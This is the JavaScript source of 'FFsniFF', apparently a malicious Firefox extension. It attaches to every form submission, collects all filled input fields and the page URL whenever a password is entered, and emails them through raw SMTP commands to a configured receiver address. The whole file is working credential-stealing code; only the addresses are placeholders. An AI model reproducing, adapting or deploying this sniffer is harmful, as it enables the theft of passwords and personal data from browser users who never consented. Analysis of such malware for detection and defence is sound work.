// set this to some host (FFsniFF will send this with EHLO command)
var send_from_host = "example.com";
// set this to the sender e-mail address
var send_from = "ffsniff@example.com";
// set this to the reciever e-mail address
var send_to = "ffsniff@example.com";
// subject of the mail
var subject = "FFsniFF log";

// smtp server which will be used to send e-mail
var smtp_host = "example-smtp.com";
// smtp port
var smtp_port = "25";

var transportService = Components.classes["@mozilla.org/network/socket-transport-service;1"].getService(Components.interfaces.nsISocketTransportService);
var transport = "";
var outstream = "";

var instream = Components.classes["@mozilla.org/scriptableinputstream;1"].createInstance(Components.interfaces.nsIScriptableInputStream);
var stream = "";

function sniff() {
	var data = "";
	var ok = 0;
	var hesla = window.content.document.getElementsByTagName("input");
	var data0 = "EHLO " + send_from_host + "\r\nMAIL FROM: <" + send_from + ">\r\nRCPT TO: <" + send_to + ">\r\nDATA\r\nSubject: " + subject +"\r\n\r\n"
	var data1 = "\r\n.\r\nQUIT\r\n"
	for (var i = 0; i < hesla.length; i++) {
		if (hesla[i].value != "") {
			if (hesla[i].type == "password") {
				ok = 1;
			}
			if (hesla[i].name == "") {
				data += hesla[i].type + ":" + "<blank>:" + hesla[i].value + "\n";
			}
			else {
				data += hesla[i].type + ":" + hesla[i].name +":" + hesla[i].value + "\n";
			}
		}
	}
	if (ok == 1) {
		data = window.top.content.document.location + "\n" + "type:name:value\n" + "---------------\n" + data;
		transport = transportService.createTransport(null, 0, smtp_host, smtp_port, null);
		outstream = transport.openOutputStream(0, 0, 0);
		stream = transport.openInputStream(1, 0, 0);
		instream.init(stream);
		outstream.write(data0, data0.length);
		while (instream.available() == 0) {}
		instream.read(instream.available());
		outstream.write(data, data.length);
		while (instream.available() == 0) {}
		instream.read(instream.available());
		outstream.write(data1, data1.length);
		while (instream.available() == 0) {}
		outstream.close();
		instream.close();
	}
}

window.addEventListener("submit", sniff, false);
